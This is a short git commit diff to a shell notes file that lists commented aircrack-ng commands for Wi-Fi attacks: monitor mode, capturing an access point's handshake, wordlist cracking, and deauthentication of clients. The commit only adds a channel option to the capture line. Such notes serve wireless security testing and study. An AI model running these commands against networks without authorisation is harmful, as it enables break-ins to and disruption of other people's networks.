b403787ddf8621273c0d500b743b2d762d63b150
Phu Bar <phubar@isotomic.com>
2016-05-15 07:44:44 -0700

    Update air.sh

--- Basic/air.sh
+++ Basic/air.sh
@@ -2,7 +2,7 @@
 
 # airmon-ng start wlan0
 # airodump-ng -i mon0
-# airodump-ng --bssid <mac of ap> --write <file> mon0 
+# airodump-ng -c <channel - no hopping> --bssid <mac of ap> --write <file> mon0 
 # aircrack-ng <file.cap> -w <wordlist>
 # aireplay-ng --deauth 5 -a <mac of ap> -h <host or client optional> mon0 --ignore-negative-one
 
